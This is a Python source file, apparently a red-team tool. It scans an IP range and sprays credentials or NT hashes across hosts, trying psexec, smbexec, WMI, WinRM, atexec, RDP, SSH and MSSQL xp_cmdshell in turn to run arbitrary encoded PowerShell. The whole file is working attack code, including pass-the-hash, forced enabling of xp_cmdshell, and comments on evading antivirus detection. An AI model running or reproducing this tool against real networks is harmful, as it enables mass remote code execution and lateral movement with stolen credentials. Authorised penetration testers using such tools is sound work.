#!/usr/bin/env python3
import subprocess
import os
import base64
import sys
import shlex
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import argparse
import shutil
import socket

EXEC_TIMEOUT = 20
RDP_TIMEOUT = 45
MAX_THREADS = 10

VERBOSE = False
OUTPUT = False
RUN_ALL = False
SKIP_PORTSCAN = False
TOOLS_SPECIFIED = False
LINUX_MODE = False

VALID_TOOLS = ["winrm", "smbexec", "wmi", "ssh", "mssql", "psexec", "atexec", "rdp"]
NXC_TOOLS = {"smbexec", "wmi", "ssh", "rdp"}

IMPACKET_PREFIX = "impacket-"  # or "" for .py suffix
NXC_CMD = "nxc"
WINRM_CMD = "evil-winrm"

print_lock = threading.Lock()

def colorize(line):
    line = line.replace("[-]", "\033[31m[-]\033[0m")
    line = line.replace("[+]", "\033[32m[+]\033[0m")
    return line

def vprint(msg):
    if VERBOSE:
        with print_lock:
            print(colorize(msg))

def oprint(msg):
    # don't want to duplicate output, so check if verbose is enabled
    if OUTPUT and not VERBOSE:
        with print_lock:
            print(colorize(msg))

def safe_print(msg):
    with print_lock:
        print(colorize(msg))

def parse_ip_range(ip_range):
    parts = ip_range.split('.')
    if len(parts) != 4:
        raise SystemExit("Invalid IP range format")

    def expand(part):
        vals = []
        for section in part.split(','):
            if '-' in section:
                s, e = map(int, section.split('-'))
                vals.extend(range(s, e + 1))
            else:
                vals.append(int(section))
        return vals

    expanded = [expand(p) for p in parts]
    return [f"{a}.{b}.{c}.{d}"
            for a in expanded[0]
            for b in expanded[1]
            for c in expanded[2]
            for d in expanded[3]]

def is_nthash(credential):
    cred = credential.lstrip(':').replace("'", "")
    if len(cred) == 32:
        try:
            int(cred, 16)
            return True
        except ValueError:
            return False
    return False


def load_credential_file(path):
    """
    Load credentials from file with newline-separated format:
    <user1>
    <user1_password>
    <user2>
    <user2_password>
    ...
    
    Blank lines and lines starting with # are ignored.
    For hashes, use the hash directly as the password line.
    """
    try:
        with open(path, "r", encoding="utf-8") as f:
            lines = [line.rstrip("\n\r") for line in f]
    except Exception as e:
        print(f"Error: cannot read credential file '{path}': {e}")
        sys.exit(1)
    creds = []
    
    filtered = []
    for line in lines:
        stripped = line.strip()
        if stripped and not stripped.startswith("#"):
            filtered.append(line)
    
    if len(filtered) % 2 != 0:
        raise SystemExit(f"Credential file has odd number of lines ({len(filtered)}). Expected pairs of user/password.")
    
    for i in range(0, len(filtered), 2):
        user = filtered[i].strip()
        cred = filtered[i + 1]
        creds.append((user, cred))
    
    return creds

def normalize_tool_name(name):
    """Normalize tool name aliases to canonical form."""
    name = name.lower().strip()
    if name in ("evilwinrm", "evil-winrm"):
        return "winrm"
    return name


def parse_tools_list(tools_str):
    """Parse comma-separated list of tools, validating each one."""
    tools = []
    for t in tools_str.split(','):
        normalized = normalize_tool_name(t)
        if normalized not in VALID_TOOLS:
            print(f"Error: Invalid tool '{t}'. Valid options: {', '.join(VALID_TOOLS)}")
            sys.exit(1)
        if normalized not in tools:
            tools.append(normalized)
    return tools

def check_port(ip, port, timeout=1):
    """Check if a port is open on the given IP."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except:
        return False

def scan_ports_for_tools(ip, tool_list):
    """
    Scan ports for given tools and return viable tools.
    For winrm, checks port 5985 for winrm and 5986 for winrm-ssl.
    Returns tuple of (viable_tools, open_ports)
    """
    viable_tools = []
    open_ports = []
    
    TOOL_PORTS = {"psexec": 445, "smbexec": 445, "atexec": 445, "wmi": 135, "rdp": 3389, "mssql": 1433, "ssh": 22, "winrm": 5985,"winrm-ssl": 5986}
    
    tools_to_check = tool_list if tool_list else VALID_TOOLS
    
    for tool in tools_to_check:
        # Check both winrm ports
        if tool == "winrm":
            if check_port(ip, 5985):
                viable_tools.append("winrm")
                if 5985 not in open_ports:
                    open_ports.append(5985)
            if check_port(ip, 5986):
                viable_tools.append("winrm-ssl")
                if 5986 not in open_ports:
                    open_ports.append(5986)
        elif tool in TOOL_PORTS:
            port = TOOL_PORTS[tool]
            if check_port(ip, port):
                viable_tools.append(tool)
                if port not in open_ports:
                    open_ports.append(port)
    
    return viable_tools, open_ports

def build_cmd(tool, user, target, credential, command):
    b64 = base64.b64encode(command.encode("utf-16le")).decode()
    use_hash = is_nthash(credential)
    hash_val = credential.lstrip(':')
    
    # For nxc tools, add --no-output unless -o was passed
    nxc_output_flag = "" if OUTPUT else " --no-output"

    # Impacket tools
    if tool == "psexec":
        cmd = impacket_cmd("psexec")
        return (f"{cmd} -hashes :{hash_val} \"{user}\"@{target} 'powershell -enc {b64}'"
                if use_hash else
                f"{cmd} \"{user}\":{credential}@{target} 'powershell -enc {b64}'")

    if tool == "mssql":
        cmd = impacket_cmd("mssqlclient")
        return (f"{cmd} -hashes :{hash_val} \"{user}\"@{target} -windows-auth -command 'enable_xp_cmdshell' -command 'xp_cmdshell powershell -enc {b64}'"
                if use_hash else
                f"{cmd} \"{user}\":{credential}@{target} -windows-auth -command 'enable_xp_cmdshell' -command 'xp_cmdshell powershell -enc {b64}'")

    if tool == "atexec":
        cmd = impacket_cmd("atexec")
        return (f"{cmd} -hashes :{hash_val} \"{user}\"@{target} 'powershell -enc {b64}'"
                if use_hash else
                f"{cmd} \"{user}\":{credential}@{target} 'powershell -enc {b64}'")

    # winrm handling - both regular and SSL variants
    # yes I know nxc has a winrm module which can oneshot commands, but evil-winrm has proved itself more dependable
    if tool == "winrm":
        return (f"echo 'powershell -enc {b64}' | {WINRM_CMD} -i {target} -u \"{user}\" -H {hash_val}"
                if use_hash else
                f"echo 'powershell -enc {b64}' | {WINRM_CMD} -i {target} -u \"{user}\" -p {credential}")
    
    if tool == "winrm-ssl":
        return (f"echo 'powershell -enc {b64}' | {WINRM_CMD} -i {target} -u \"{user}\" -H {hash_val} --ssl"
                if use_hash else
                f"echo 'powershell -enc {b64}' | {WINRM_CMD} -i {target} -u \"{user}\" -p {credential} --ssl")

    # NXC tools
    if tool == "smbexec":
        return (f"{NXC_CMD} smb {target} -H {hash_val} -u \"{user}\" -X 'powershell -enc {b64}' --exec-method smbexec{nxc_output_flag}"
                if use_hash else
                f"{NXC_CMD} smb {target} -p {credential} -u \"{user}\" -X 'powershell -enc {b64}' --exec-method smbexec{nxc_output_flag}")

    if tool == "wmi":
        # we don't actually need to pass the --no-output here, as defender won't catch it regardless it seems
        # additionally, adding --no-output makes it very difficult to differentiate between command execution and a successful authentication w/o execution
        return (f"{NXC_CMD} wmi {target} -H {hash_val} -u \"{user}\" -X 'powershell -enc {b64}'"
                if use_hash else
                f"{NXC_CMD} wmi {target} -p {credential} -u \"{user}\" -X 'powershell -enc {b64}'")

    if tool == "ssh":
        if LINUX_MODE:
            b64 = base64.b64encode(command.encode("utf-8")).decode()
            return f"{NXC_CMD} ssh {target} -p {credential} -u \"{user}\" -x 'echo {b64} | base64 -d | $0'{nxc_output_flag}"
        return f"{NXC_CMD} ssh {target} -p {credential} -u \"{user}\" -x 'powershell -enc {b64}'{nxc_output_flag}"

    if tool == "rdp":
        return (f"{NXC_CMD} rdp {target} -u \"{user}\" -H {hash_val} -X 'powershell -enc {b64}'{nxc_output_flag}"
                if use_hash else
                f"{NXC_CMD} rdp {target} -u \"{user}\" -p {credential} -X 'powershell -enc {b64}'{nxc_output_flag}")

    raise Exception(f"Unknown tool: {tool}")

def run_chain(user, ip, credential, command, tool_list=None):
    chain = tool_list if tool_list else VALID_TOOLS

    # test both winrm types
    if TOOLS_SPECIFIED:
        expanded_chain = []
        for tool in chain:
            if tool == "winrm":
                expanded_chain.extend(["winrm", "winrm-ssl"])
            elif tool not in expanded_chain:  # Avoid duplicates
                expanded_chain.append(tool)
        chain = expanded_chain

    for tool in chain:
        # Can't pass the hash with SSH
        if tool == "ssh" and is_nthash(credential):
            safe_print(f"  [-] Skipping SSH for {ip}: cannot pass the hash.")
            continue

        if tool == "rdp" and NXC_CMD == "crackmapexec":
            safe_print(f"  [-] Skipping RDP for {ip}: crackmapexec does not support running commands via RDP.")
            continue

        if tool == "mssql":
            safe_print(f"[*] Attempting to enable xp_cmdshell on {ip}...")

        cmd = build_cmd(tool, user, ip, credential, command)
        safe_print(f"[*] Trying {tool}: {cmd}")

        try:
            timeout = RDP_TIMEOUT if tool == "rdp" else EXEC_TIMEOUT
            result = subprocess.run(cmd, shell=True, timeout=timeout, capture_output=True)
            rc = result.returncode
            out = result.stdout.decode("utf-8", errors="ignore")
            vprint(f"[v] Output for {tool} on {ip} (rc={rc}):")
            if not out or out == '':
                vprint(f"(no output)")
            else:
                vprint(out)

        except subprocess.TimeoutExpired:
            safe_print(f"  [-] For {ip}: {tool} timed out.")
            continue

        # psexec can have "[-]" in stdout if some shares are writeable and others aren't
        if tool == "psexec":
            if "Found writable share" in out:
                if "Stopping service" in out:
                    # psexec succeeded and exited (sometimes with rc 1!)
                    if RUN_ALL:
                        # need to run all tools, even if we succeeded
                        safe_print(f"  [+] Success! With command: {cmd}")
                        oprint(out)
                        continue
                    return (tool, out, cmd)
                else:
                    # if "Stopping service" not detected, AV likely caught binary, so it hangs
                    safe_print(f"  [-] For {ip}: {tool} auth succeeded, but timed out likely due to AV.")
                    continue
            else:
                # made it through psexec, but no writeable shares found (will return rc 0)
                safe_print(f"  [-] For {ip}: {tool} failed.")
                continue

        if tool == "rdp":
            if "[-] Clipboard" in out:
                safe_print(f"  \033[33m[!]\033[0m For {ip}: {tool} succeeded as {user} with {credential}, but failed to initialize clipboard and run command. Try manually using RDP.")
                continue
            elif "unrecognized arguments" in out:
                safe_print(f"  [-] For {ip}: {tool} failed. NetExec is out of date; 'nxc rdp' doesn't support '-X'. Please reinstall netexec to use RDP.")
                continue
            elif "[-]" in out:
                safe_print(f"  [-] For {ip}: {tool} failed.")
                continue

        if tool in NXC_TOOLS or tool == "atexec":
            if '[-]' in out:
                if "Could not retrieve" in out:
                    safe_print(f"  \033[33m[!]\033[0m For {ip}: {tool} AUTHENTICATION succeeded as {user} with {credential}, but likely failed to run command. Try running without -o to avoid tripping AV.")
                # nxc will return 0 if the tool succeeded but auth failed
                else:
                    safe_print(f"  [-] For {ip}: {tool} failed.")
                continue
            if tool == "ssh" and 'Linux - Shell' in out and not LINUX_MODE:
                safe_print(f"  \033[33m[!]\033[0m For {ip}: {tool} AUTHENTICATION succeeded as {user} with {credential}, but this seems like a Linux machine, so the command didn't run.")
                safe_print("  \033[33m[!]\033[0m Use \033[33m--linux\033[0m to run command across Linux machines.")
                continue
            if '[+]' in out and 'Executed command' not in out:
                safe_print(f"  \033[33m[!]\033[0m For {ip}: {tool} AUTHENTICATION succeeded as {user} with {credential}, but seemingly failed to run command. Does the user have the necessary permissions?")
                continue
            if rc == 0 and out == "":
                # nxc tools will sometimes just fail silently
                safe_print(f"  [-] For {ip}: {tool} failed.")
                continue

        if tool == "mssql":
            if "The EXECUTE permission was denied" in out:
                safe_print(f"  \033[33m[!]\033[0m For {ip}: {tool} AUTHENTICATION succeeded as {user} with {credential}, but seemingly failed to run command. Does the user have the necessary permissions?")
                continue
            if "ERROR" in out:
                safe_print(f"  [-] For {ip}: {tool} failed.")
                continue

        # one-shotting using evil-winrm results in a return code of 1
        if rc == 0 or (tool in ("winrm", "winrm-ssl") and rc == 1 and "NoMethodError" in out): 
            if RUN_ALL:
                # need to run all tools, even if we succeeded
                safe_print(f"  [+] Success! With command: {cmd}")
                oprint(out)
                continue
            return (tool, out, cmd)

        safe_print(f"  [-] For {ip}: {tool} failed.")

    return None

def execute_on_ip(username, ip, credential, command, tool_list=None):
    
    if SKIP_PORTSCAN:
        safe_print(f"[*] Skipping portscan for {ip} (--skip-portscan enabled)")
        viable_tools = tool_list if tool_list else VALID_TOOLS
    else:
        safe_print(f"[*] Checking applicable tools for {ip} via portscan")
        viable_tools, open_ports = scan_ports_for_tools(ip, tool_list)
        
        if VERBOSE:
            vprint(f"[v] Open ports for {ip}: {sorted(open_ports)}")
        
        if not viable_tools:
            safe_print(f"[-] No required ports open for {ip}. Either it's not up, or the target is firewalled. If you want to try anyway, use --skip-portscan.")
            return (ip, None)
        
        display_tools = ["winrm" if t == "winrm-ssl" else t for t in viable_tools]
        display_tools = list(dict.fromkeys(display_tools))  
        safe_print(f"    \033[34m[i]\033[0m Viable tools found for {ip} based on portscan: {', '.join(display_tools)}")
    
    result = run_chain(username, ip, credential, command, viable_tools)

    if RUN_ALL:
        safe_print(f"[*] All tools successfully run for {ip} with {username}.")
        return (ip, None)
        
    if result is None:
        safe_print(f"[-] All tools failed for {ip} with {username}.")
        return (ip, None)

    tool, out, cmd = result
    safe_print(f"  [+] Success! With command: {cmd}")
    if tool == "mssql":
        safe_print(f"\033[33m[!] WARNING: MSSQL used for command execution; xp_cmdshell is currently enabled on {ip}. \033[0m")
    oprint(out)
    if not RUN_ALL:
        return (ip, tool)

def parse_args():
    parser = argparse.ArgumentParser(
        description="Execute commands across an IP range using multiple Windows RCE methods",
        formatter_class=argparse.RawTextHelpFormatter,
        usage="%(prog)s ip_range username credential command [-h] [-v] [-o] [--threads NUM_THREADS] [--timeout TIMEOUT_SECONDS] [--tools LIST] [--run-all] [--skip-portscan] [-f CRED_FILE]"
    )

    parser.add_argument("-v", action="store_true", help="Verbose output")
    parser.add_argument("-o", action="store_true", help="Show successful command output")
    parser.add_argument("--threads", metavar="NUM_THREADS", type=int, default=10, help="Number of concurrent threads")
    parser.add_argument("--timeout", metavar="TIMEOUT_SECONDS", type=int, default=15, help="Number of seconds before commands timeout")
    parser.add_argument("--tools", metavar="LIST", help="Comma-separated list of tools to try")
    parser.add_argument("--run-all", action="store_true", help="Run all tools, often running the desired command multiple times")
    parser.add_argument("--skip-portscan", action="store_true", help="Skip port scanning and attempt all tools")
    parser.add_argument("-f", "--file", metavar="CRED_FILE", help="Credential file (newline-separated user/password pairs)")

    parser.add_argument("--linux", action="store_true", help="Linux-only mode - automates SSH, ignores other tools")

    parser.add_argument("ip_range", help="IP range (e.g., 192.168.1.1-254)")
    parser.add_argument("username", nargs="?", help="Username")
    parser.add_argument("credential", nargs="?", help="Password or NT hash")
    parser.add_argument("command", nargs="*", help="Command to run (default: whoami)")

    args = parser.parse_args()

    if args.file and (args.username or args.credential):
        parser.error("Cannot specify username/password when using -f")

    if not args.file and (not args.username or not args.credential):
        parser.error("Must supply either -f FILE or username and credential")

    return args



def check_dependencies():
    """Check if required tools are installed."""
    global IMPACKET_PREFIX, NXC_CMD, WINRM_CMD

    # Check impacket (either impacket-psexec or psexec.py)
    r1 = shutil.which("impacket-psexec")
    r2 = shutil.which("psexec.py")
    if r1:
        IMPACKET_PREFIX = "impacket-"
    elif r2:
        IMPACKET_PREFIX = ""
    elif not LINUX_MODE:
        print("[-] impacket not found. Install with: pipx install impacket")
        sys.exit(1)
    
    # Check nxc/crackmapexec
    r1 = shutil.which("nxc")
    r2 = shutil.which("netexec")
    r3 = shutil.which("crackmapexec")
    if r1:
        NXC_CMD = "nxc"
    elif r2:
        NXC_CMD = "netexec"
    elif r3:
        NXC_CMD = "crackmapexec"
    else:
        print("[-] netexec not found. Install with: pipx install git+https://github.com/Pennyw0rth/NetExec")
        sys.exit(1)

    # Check evil-winrm
    if shutil.which("evil-winrm"):
        WINRM_CMD = "evil-winrm"
    else:
        # default in exegol
        base = "/usr/local/rvm/gems"
        for d in os.listdir(base):
            if d.endswith("@evil-winrm"):
                WINRM_CMD = f"{base}/{d}/wrappers/evil-winrm"
    if not WINRM_CMD and not LINUX_MODE:
        print("[-] evil-winrm not found. Please install with gem install evil-winrm")
        sys.exit(1)
    
def impacket_cmd(tool):
    """Return the correct impacket command name based on install type."""
    if IMPACKET_PREFIX:
        return f"impacket-{tool}"
    return f"{tool}.py"

def main():
    global VERBOSE, OUTPUT, MAX_THREADS, EXEC_TIMEOUT, RUN_ALL, SKIP_PORTSCAN, TOOLS_SPECIFIED, LINUX_MODE

    check_dependencies()

    args = parse_args()

    VERBOSE = args.v
    OUTPUT = args.o
    MAX_THREADS = args.threads if args.threads > 0 else 1
    EXEC_TIMEOUT = args.timeout
    RUN_ALL = args.run_all
    SKIP_PORTSCAN = args.skip_portscan
    LINUX_MODE = args.linux

    if args.file:
        credential_list = load_credential_file(args.file)
    else:
        credential_list = [(args.username, args.credential)]

    if args.ip_range.endswith('.txt'):
        ips = []
        with open(args.ip_range) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    ips.extend(parse_ip_range(line))
    else:
        ips = parse_ip_range(args.ip_range)

    if len(ips) < MAX_THREADS and not args.threads:
        MAX_THREADS = len(ips)

    print(f"[*] Loaded {len(credential_list)} credential set(s)")
    print(f"[*] Processing {len(ips)} IPs with {MAX_THREADS} threads...")

    if args.linux:
        if args.tools:
            print("\033[31m[!] Tools (--tools) cannot be specified alongside Linux-mode (--linux), as only SSH is supported. Continuing with SSH...\033[0m")
        args.tools = "ssh"

    if args.tools:
        tool_list = parse_tools_list(args.tools)
        TOOLS_SPECIFIED = True
        print(f"[*] Using tools: {', '.join(tool_list)}")
    else:
        tool_list = None
    
    if args.skip_portscan:
        print("\033[33m[!] Port scanning disabled (--skip-portscan). All tools will be attempted.\033[0m")

    command = " ".join(args.command) if args.command else "whoami"
    
    if not OUTPUT:
        print("\033[33m[!] Output Disabled. Run with -o to see successful command output\033[0m")
    elif not LINUX_MODE:
        print("-" * 20)
        print("\033[33m[!] WARNING: Output Enabled. This WILL trip AV for certain tools\033[0m")
        print("-" * 20)

    futures = []
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        for ip in ips:
            for (user, cred) in credential_list:
                cred = shlex.quote(cred)
                futures.append(
                    executor.submit(execute_on_ip, user, ip, cred, command, tool_list)
                )

        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                safe_print(f"[!] Exception: {e}")

if __name__ == "__main__":
    main()